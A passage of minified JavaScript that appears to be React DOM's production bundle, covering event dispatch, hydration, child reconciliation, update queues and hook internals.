e;if((g||h)&&(h=u.window===u?u:(h=u.ownerDocument)?h.defaultView||h.parentWindow:window,g?(k=t.relatedTarget||t.toElement,g=c,k=k?Zn(k):null,k!==null&&(x=ht(k),k!==x||k.tag!==5&&k.tag!==6)&&(k=null)):(g=null,k=c),g!==k)){if(y=Fo,w="onMouseLeave",p="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(y=Vo,w="onPointerLeave",p="onPointerEnter",f="pointer"),x=g==null?h:xt(g),v=k==null?h:xt(k),h=new y(w,f+"leave",g,t,u),h.target=x,h.relatedTarget=v,w=null,Zn(u)===c&&(y=new y(p,f+"enter",k,t,u),y.target=v,y.relatedTarget=x,w=y),x=w,g&&k)n:{for(y=g,p=k,f=0,v=y;v;v=mt(v))f++;for(v=0,w=p;w;w=mt(w))v++;for(;0<f-v;)y=mt(y),f--;for(;0<v-f;)p=mt(p),v--;for(;f--;){if(y===p||p!==null&&y===p.alternate)break n;y=mt(y),p=mt(p)}y=null}else y=null;g!==null&&Jo(m,h,g,y,!1),k!==null&&x!==null&&Jo(m,x,k,y,!0)}}e:{if(h=c?xt(c):window,g=h.nodeName&&h.nodeName.toLowerCase(),g==="select"||g==="input"&&h.type==="file")var _=Ff;else if($o(h))if(op)_=Wf;else{_=Vf;var N=Uf}else(g=h.nodeName)&&g.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(_=Hf);if(_&&(_=_(e,c))){lp(m,_,t,u);break e}N&&N(e,h,c),e==="focusout"&&(N=h._wrapperState)&&N.controlled&&h.type==="number"&&ya(h,"number",h.value)}switch(N=c?xt(c):window,e){case"focusin":($o(N)||N.contentEditable==="true")&&(wt=N,Pa=c,ms=null);break;case"focusout":ms=Pa=wt=null;break;case"mousedown":La=!0;break;case"contextmenu":case"mouseup":case"dragend":La=!1,Ko(m,t,u);break;case"selectionchange":if(Yf)break;case"keydown":case"keyup":Ko(m,t,u)}var A;if(Ml)e:{switch(e){case"compositionstart":var P="onCompositionStart";break e;case"compositionend":P="onCompositionEnd";break e;case"compositionupdate":P="onCompositionUpdate";break e}P=void 0}else yt?ip(e,t)&&(P="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(P="onCompositionStart");P&&(rp&&t.locale!=="ko"&&(yt||P!=="onCompositionStart"?P==="onCompositionEnd"&&yt&&(A=sp()):(Pn=u,Ll="value"in Pn?Pn.value:Pn.textContent,yt=!0)),N=Vr(c,P),0<N.length&&(P=new Uo(P,e,null,t,u),m.push({event:P,listeners:N}),A?P.data=A:(A=ap(t),A!==null&&(P.data=A)))),(A=jf?If(e,t):zf(e,t))&&(c=Vr(c,"onBeforeInput"),0<c.length&&(u=new Uo("onBeforeInput","beforeinput",null,t,u),m.push({event:u,listeners:c}),u.data=A))}yp(m,n)})}function As(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Vr(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=bs(e,t),i!=null&&s.unshift(As(e,i,r)),i=bs(e,n),i!=null&&s.push(As(e,i,r))),e=e.return}return s}function mt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Jo(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=bs(t,i),o!=null&&a.unshift(As(t,o,l))):r||(o=bs(t,i),o!=null&&a.push(As(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Qf=/\r\n?/g,Zf=/\u0000|\uFFFD/g;function ec(e){return(typeof e=="string"?e:""+e).replace(Qf,`
`).replace(Zf,"")}function or(e,n,t){if(n=ec(n),ec(e)!==n&&t)throw Error(T(425))}function Hr(){}var Ra=null,Oa=null;function Ma(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var ja=typeof setTimeout=="function"?setTimeout:void 0,Jf=typeof clearTimeout=="function"?clearTimeout:void 0,nc=typeof Promise=="function"?Promise:void 0,em=typeof queueMicrotask=="function"?queueMicrotask:typeof nc<"u"?function(e){return nc.resolve(null).then(e).catch(nm)}:ja;function nm(e){setTimeout(function(){throw e})}function Qi(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),Es(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);Es(n)}function zn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function tc(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Yt=Math.random().toString(36).slice(2),tn="__reactFiber$"+Yt,Ps="__reactProps$"+Yt,yn="__reactContainer$"+Yt,Ia="__reactEvents$"+Yt,tm="__reactListeners$"+Yt,sm="__reactHandles$"+Yt;function Zn(e){var n=e[tn];if(n)return n;for(var t=e.parentNode;t;){if(n=t[yn]||t[tn]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=tc(e);e!==null;){if(t=e[tn])return t;e=tc(e)}return n}e=t,t=e.parentNode}return null}function Gs(e){return e=e[tn]||e[yn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function xt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(T(33))}function vi(e){return e[Ps]||null}var za=[],bt=-1;function Gn(e){return{current:e}}function G(e){0>bt||(e.current=za[bt],za[bt]=null,bt--)}function H(e,n){bt++,za[bt]=e.current,e.current=n}var Wn={},ge=Gn(Wn),Ne=Gn(!1),at=Wn;function zt(e,n){var t=e.type.contextTypes;if(!t)return Wn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Ae(e){return e=e.childContextTypes,e!=null}function Wr(){G(Ne),G(ge)}function sc(e,n,t){if(ge.current!==Wn)throw Error(T(168));H(ge,n),H(Ne,t)}function kp(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(T(108,Fh(e)||"Unknown",r));return K({},t,s)}function $r(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Wn,at=ge.current,H(ge,e),H(Ne,Ne.current),!0}function rc(e,n,t){var s=e.stateNode;if(!s)throw Error(T(169));t?(e=kp(e,n,at),s.__reactInternalMemoizedMergedChildContext=e,G(Ne),G(ge),H(ge,e)):G(Ne),H(Ne,t)}var pn=null,yi=!1,Zi=!1;function xp(e){pn===null?pn=[e]:pn.push(e)}function rm(e){yi=!0,xp(e)}function Yn(){if(!Zi&&pn!==null){Zi=!0;var e=0,n=V;try{var t=pn;for(V=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}pn=null,yi=!1}catch(r){throw pn!==null&&(pn=pn.slice(e+1)),Gu(Cl,Yn),r}finally{V=n,Zi=!1}}return null}var _t=[],St=0,Gr=null,Yr=0,De=[],Be=0,lt=null,hn=1,fn="";function Kn(e,n){_t[St++]=Yr,_t[St++]=Gr,Gr=e,Yr=n}function bp(e,n,t){De[Be++]=hn,De[Be++]=fn,De[Be++]=lt,lt=e;var s=hn;e=fn;var r=32-Ke(s)-1;s&=~(1<<r),t+=1;var i=32-Ke(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,hn=1<<32-Ke(n)+r|t<<r|s,fn=i+e}else hn=1<<i|t<<r|s,fn=e}function Il(e){e.return!==null&&(Kn(e,1),bp(e,1,0))}function zl(e){for(;e===Gr;)Gr=_t[--St],_t[St]=null,Yr=_t[--St],_t[St]=null;for(;e===lt;)lt=De[--Be],De[Be]=null,fn=De[--Be],De[Be]=null,hn=De[--Be],De[Be]=null}var Oe=null,Re=null,Y=!1,Ye=null;function _p(e,n){var t=Fe(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function ic(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Oe=e,Re=zn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Oe=e,Re=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=lt!==null?{id:hn,overflow:fn}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Fe(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Oe=e,Re=null,!0):!1;default:return!1}}function Da(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Ba(e){if(Y){var n=Re;if(n){var t=n;if(!ic(e,n)){if(Da(e))throw Error(T(418));n=zn(t.nextSibling);var s=Oe;n&&ic(e,n)?_p(s,t):(e.flags=e.flags&-4097|2,Y=!1,Oe=e)}}else{if(Da(e))throw Error(T(418));e.flags=e.flags&-4097|2,Y=!1,Oe=e}}}function ac(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Oe=e}function cr(e){if(e!==Oe)return!1;if(!Y)return ac(e),Y=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Ma(e.type,e.memoizedProps)),n&&(n=Re)){if(Da(e))throw Sp(),Error(T(418));for(;n;)_p(e,n),n=zn(n.nextSibling)}if(ac(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(T(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Re=zn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Re=null}}else Re=Oe?zn(e.stateNode.nextSibling):null;return!0}function Sp(){for(var e=Re;e;)e=zn(e.nextSibling)}function Dt(){Re=Oe=null,Y=!1}function Dl(e){Ye===null?Ye=[e]:Ye.push(e)}var im=bn.ReactCurrentBatchConfig;function es(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(T(309));var s=t.stateNode}if(!s)throw Error(T(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(T(284));if(!t._owner)throw Error(T(290,e))}return e}function ur(e,n){throw e=Object.prototype.toString.call(n),Error(T(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function lc(e){var n=e._init;return n(e._payload)}function Ep(e){function n(p,f){if(e){var v=p.deletions;v===null?(p.deletions=[f],p.flags|=16):v.push(f)}}function t(p,f){if(!e)return null;for(;f!==null;)n(p,f),f=f.sibling;return null}function s(p,f){for(p=new Map;f!==null;)f.key!==null?p.set(f.key,f):p.set(f.index,f),f=f.sibling;return p}function r(p,f){return p=Un(p,f),p.index=0,p.sibling=null,p}function i(p,f,v){return p.index=v,e?(v=p.alternate,v!==null?(v=v.index,v<f?(p.flags|=2,f):v):(p.flags|=2,f)):(p.flags|=1048576,f)}function a(p){return e&&p.alternate===null&&(p.flags|=2),p}function l(p,f,v,w){return f===null||f.tag!==6?(f=ia(v,p.mode,w),f.return=p,f):(f=r(f,v),f.return=p,f)}function o(p,f,v,w){var _=v.type;return _===vt?u(p,f,v.props.children,w,v.key):f!==null&&(f.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===En&&lc(_)===f.type)?(w=r(f,v.props),w.ref=es(p,f,v),w.return=p,w):(w=Pr(v.type,v.key,v.props,null,p.mode,w),w.ref=es(p,f,v),w.return=p,w)}function c(p,f,v,w){return f===null||f.tag!==4||f.stateNode.containerInfo!==v.containerInfo||f.stateNode.implementation!==v.implementation?(f=aa(v,p.mode,w),f.return=p,f):(f=r(f,v.children||[]),f.return=p,f)}function u(p,f,v,w,_){return f===null||f.tag!==7?(f=st(v,p.mode,w,_),f.return=p,f):(f=r(f,v),f.return=p,f)}function m(p,f,v){if(typeof f=="string"&&f!==""||typeof f=="number")return f=ia(""+f,p.mode,v),f.return=p,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case Js:return v=Pr(f.type,f.key,f.props,null,p.mode,v),v.ref=es(p,null,f),v.return=p,v;case gt:return f=aa(f,p.mode,v),f.return=p,f;case En:var w=f._init;return m(p,w(f._payload),v)}if(as(f)||Xt(f))return f=st(f,p.mode,v,null),f.return=p,f;ur(p,f)}return null}function h(p,f,v,w){var _=f!==null?f.key:null;if(typeof v=="string"&&v!==""||typeof v=="number")return _!==null?null:l(p,f,""+v,w);if(typeof v=="object"&&v!==null){switch(v.$$typeof){case Js:return v.key===_?o(p,f,v,w):null;case gt:return v.key===_?c(p,f,v,w):null;case En:return _=v._init,h(p,f,_(v._payload),w)}if(as(v)||Xt(v))return _!==null?null:u(p,f,v,w,null);ur(p,v)}return null}function g(p,f,v,w,_){if(typeof w=="string"&&w!==""||typeof w=="number")return p=p.get(v)||null,l(f,p,""+w,_);if(typeof w=="object"&&w!==null){switch(w.$$typeof){case Js:return p=p.get(w.key===null?v:w.key)||null,o(f,p,w,_);case gt:return p=p.get(w.key===null?v:w.key)||null,c(f,p,w,_);case En:var N=w._init;return g(p,f,v,N(w._payload),_)}if(as(w)||Xt(w))return p=p.get(v)||null,u(f,p,w,_,null);ur(f,w)}return null}function k(p,f,v,w){for(var _=null,N=null,A=f,P=f=0,z=null;A!==null&&P<v.length;P++){A.index>P?(z=A,A=null):z=A.sibling;var M=h(p,A,v[P],w);if(M===null){A===null&&(A=z);break}e&&A&&M.alternate===null&&n(p,A),f=i(M,f,P),N===null?_=M:N.sibling=M,N=M,A=z}if(P===v.length)return t(p,A),Y&&Kn(p,P),_;if(A===null){for(;P<v.length;P++)A=m(p,v[P],w),A!==null&&(f=i(A,f,P),N===null?_=A:N.sibling=A,N=A);return Y&&Kn(p,P),_}for(A=s(p,A);P<v.length;P++)z=g(A,p,P,v[P],w),z!==null&&(e&&z.alternate!==null&&A.delete(z.key===null?P:z.key),f=i(z,f,P),N===null?_=z:N.sibling=z,N=z);return e&&A.forEach(function(Q){return n(p,Q)}),Y&&Kn(p,P),_}function y(p,f,v,w){var _=Xt(v);if(typeof _!="function")throw Error(T(150));if(v=_.call(v),v==null)throw Error(T(151));for(var N=_=null,A=f,P=f=0,z=null,M=v.next();A!==null&&!M.done;P++,M=v.next()){A.index>P?(z=A,A=null):z=A.sibling;var Q=h(p,A,M.value,w);if(Q===null){A===null&&(A=z);break}e&&A&&Q.alternate===null&&n(p,A),f=i(Q,f,P),N===null?_=Q:N.sibling=Q,N=Q,A=z}if(M.done)return t(p,A),Y&&Kn(p,P),_;if(A===null){for(;!M.done;P++,M=v.next())M=m(p,M.value,w),M!==null&&(f=i(M,f,P),N===null?_=M:N.sibling=M,N=M);return Y&&Kn(p,P),_}for(A=s(p,A);!M.done;P++,M=v.next())M=g(A,p,P,M.value,w),M!==null&&(e&&M.alternate!==null&&A.delete(M.key===null?P:M.key),f=i(M,f,P),N===null?_=M:N.sibling=M,N=M);return e&&A.forEach(function(pe){return n(p,pe)}),Y&&Kn(p,P),_}function x(p,f,v,w){if(typeof v=="object"&&v!==null&&v.type===vt&&v.key===null&&(v=v.props.children),typeof v=="object"&&v!==null){switch(v.$$typeof){case Js:e:{for(var _=v.key,N=f;N!==null;){if(N.key===_){if(_=v.type,_===vt){if(N.tag===7){t(p,N.sibling),f=r(N,v.props.children),f.return=p,p=f;break e}}else if(N.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===En&&lc(_)===N.type){t(p,N.sibling),f=r(N,v.props),f.ref=es(p,N,v),f.return=p,p=f;break e}t(p,N);break}else n(p,N);N=N.sibling}v.type===vt?(f=st(v.props.children,p.mode,w,v.key),f.return=p,p=f):(w=Pr(v.type,v.key,v.props,null,p.mode,w),w.ref=es(p,f,v),w.return=p,p=w)}return a(p);case gt:e:{for(N=v.key;f!==null;){if(f.key===N)if(f.tag===4&&f.stateNode.containerInfo===v.containerInfo&&f.stateNode.implementation===v.implementation){t(p,f.sibling),f=r(f,v.children||[]),f.return=p,p=f;break e}else{t(p,f);break}else n(p,f);f=f.sibling}f=aa(v,p.mode,w),f.return=p,p=f}return a(p);case En:return N=v._init,x(p,f,N(v._payload),w)}if(as(v))return k(p,f,v,w);if(Xt(v))return y(p,f,v,w);ur(p,v)}return typeof v=="string"&&v!==""||typeof v=="number"?(v=""+v,f!==null&&f.tag===6?(t(p,f.sibling),f=r(f,v),f.return=p,p=f):(t(p,f),f=ia(v,p.mode,w),f.return=p,p=f),a(p)):t(p,f)}return x}var Bt=Ep(!0),Tp=Ep(!1),qr=Gn(null),Xr=null,Et=null,Bl=null;function Fl(){Bl=Et=Xr=null}function Ul(e){var n=qr.current;G(qr),e._currentValue=n}function Fa(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function Rt(e,n){Xr=e,Bl=Et=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Te=!0),e.firstContext=null)}function Ve(e){var n=e._currentValue;if(Bl!==e)if(e={context:e,memoizedValue:n,next:null},Et===null){if(Xr===null)throw Error(T(308));Et=e,Xr.dependencies={lanes:0,firstContext:e}}else Et=Et.next=e;return n}var Jn=null;function Vl(e){Jn===null?Jn=[e]:Jn.push(e)}function Cp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Vl(n)):(t.next=r.next,r.next=t),n.interleaved=t,wn(e,s)}function wn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var Tn=!1;function Hl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Np(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function gn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Dn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,U&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,wn(e,t)}return r=s.interleaved,r===null?(n.next=n,Vl(s)):(n.next=r.next,r.next=n),s.interleaved=n,wn(e,t)}function Sr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,Nl(e,t)}}function oc(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Kr(e,n,t,s){var r=e.updateQueue;Tn=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var u=e.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==a&&(l===null?u.firstBaseUpdate=c:l.next=c,u.lastBaseUpdate=o))}if(i!==null){var m=r.baseState;a=0,u=c=o=null,l=i;do{var h=l.lane,g=l.eventTime;if((s&h)===h){u!==null&&(u=u.next={eventTime:g,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var k=e,y=l;switch(h=n,g=t,y.tag){case 1:if(k=y.payload,typeof k=="function"){m=k.call(g,m,h);break e}m=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=y.payload,h=typeof k=="function"?k.call(g,m,h):k,h==null)break e;m=K({},m,h);break e;case 2:Tn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,h=r.effects,h===null?r.effects=[l]:h.push(l))}else g={eventTime:g,lane:h,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(c=u=g,o=m):u=u.next=g,a|=h;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;h=l,l=h.next,h.next=null,r.lastBaseUpdate=h,r.shared.pending=null}}while(!0);if(u===null&&(o=m),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=u,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);ct|=a,e.lanes=a,e.memoizedState=m}}function cc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(T(191,r));r.call(s)}}}var Ys={},rn=Gn(Ys),Ls=Gn(Ys),Rs=Gn(Ys);function et(e){if(e===Ys)throw Error(T(174));return e}function Wl(e,n){switch(H(Rs,n),H(Ls,e),H(rn,Ys),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:ka(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=ka(n,e)}G(rn),H(rn,n)}function Ft(){G(rn),G(Ls),G(Rs)}function Ap(e){et(Rs.current);var n=et(rn.current),t=ka(n,e.type);n!==t&&(H(Ls,e),H(rn,t))}function $l(e){Ls.current===e&&(G(rn),G(Ls))}var q=Gn(0);function Qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Ji=[];function Gl(){for(var e=0;e<Ji.length;e++)Ji[e]._workInProgressVersionPrimary=null;Ji.length=0}var Er=bn.ReactCurrentDispatcher,ea=bn.ReactCurrentBatchConfig,ot=0,X=null,te=null,re=null,Zr=!1,gs=!1,Os=0,am=0;function he(){throw Error(T(321))}function Yl(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Ze(e[t],n[t]))return!1;return!0}function ql(e,n,t,s,r,i){if(ot=i,X=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Er.current=e===null||e.memoizedState===null?um:pm,e=t(s,r),gs){i=0;do{if(gs=!1,Os=0,25<=i)throw Error(T(301));i+=1,re=te=null,n.updateQueue=null,Er.current=dm,e=t(s,r)}while(gs)}if(Er.current=Jr,n=te!==null&&te.next!==null,ot=0,re=te=X=null,Zr=!1,n)throw Error(T(300));return e}function Xl(){var e=Os!==0;return Os=0,e}function nn(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return re===null?X.memoizedState=re=e:re=re.next=e,re}function He(){if(te===null){var e=X.alternate;e=e!==null?e.memoizedState:null}else e=te.next;var n=re===null?X.memoizedState:re.next;if(n!==null)re=n,te=e;else{if(e===null)throw Error(T(310));te=e,e={memoizedState:te.memoizedState,baseState:te.baseState,baseQueue:te.baseQueue,queue:te.queue,next:null},re===null?X.memoizedState=re=e:re=re.next=e}return re}function Ms(e,n){return typeof n=="function"?n(e):n}function na(e){var n=He(),t=n.queue;if(t===null)throw Error(T(311));t.lastRenderedReducer=e;var s=te,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var u=c.lane;if((ot&u)===u)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var m={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=m,a=s):o=o.next=m,X.lanes|=u,ct|=u}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,Ze(s,n.memoizedState)||(Te=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,X.lanes|=i,ct|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function ta(e){var n=He(),t=n.queue;if(t===null)throw Error(T(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);Ze(i,n.memoizedState)||(Te=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function Pp(){}function Lp(e,n){var t=X,s=He(),r=n(),i=!Ze(s.memoizedState,r);if(i&&(s.memoizedState=r,Te=!0),s=s.queue,Kl(Mp.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||re!==null&&re.memoizedState.tag&1){if(t.flags|=2048,js(9,Op.bind(null,t,s,r,n),void 0,null),ie===null)throw Error(T(349));ot&30||Rp(t,n,r)}return r}function Rp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Op(e,n,t,s){n.value=t,n.getSnapshot=s,jp(n)&&Ip(e)}function Mp(e,n,t){return t(function(){jp(n)&&Ip(e)})}function jp(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Ze(e,t)}catch{return!0}}function Ip(e){var n=wn(e,1);n!==null&&Qe(n,e,1,-1)}function uc(e){var n=nn();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ms,lastRenderedState:e},n.queue=e,e=e.dispatch=cm.bind(null,X,e),[n.memoizedState,e]}function js(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function zp(){return He().memoizedState}function Tr(e,n,t,s){var r=nn();X.flags|=e,r.memoizedState=js(1|n,t,void 0,s===void 0?null:s)}function wi(e,n,t,s){var r=He();s=s===void 0?null:s;var i=void 0;if(te!==null){var a=te.memoizedState;if(i=a.destroy,s!==null&&Yl(s,a.deps)){r.memoizedState=js(n,t,i,s);return}}X.flags|=e,r.memoizedState=js(1|n,t,i,s)}function pc(e,n){return Tr(8390656,8,e,n)}function Kl(e,n){return wi(2048,8,e,n)}function Dp(e,n){return wi(4,2,e,n)}function Bp(e,n){return wi(4,4,e,n)}function Fp(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Up(e,n,t){return t=t!=null?t.concat([e]):null,wi(4,4,Fp.bind(null,n,e),t)}function Ql(){}function Vp(e,n){var t=He();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Yl(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Hp(e,n){var t=He();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Yl(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function Wp(e,n,t){return ot&21?(Ze(t,n)||(t=Xu(),X.lanes|=t,ct|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Te=!0),e.memoizedState=t)}function lm(e,n){var t=V;V=t!==0&&4>t?t:4,e(!0);var s=ea.transition;ea.transition={};try{e(!1),n()}finally{V=t,ea.transition=s}}function $p(){return He().memoizedState}function om(e,n,t){var s=Fn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Gp(e))Yp(n,t);else if(t=Cp(e,n,t,s),t!==null){var r=xe();Qe(t,e,s,r),qp(t,n,s)}}function cm(e,n,t){var s=Fn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Gp(e))Yp(n,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var 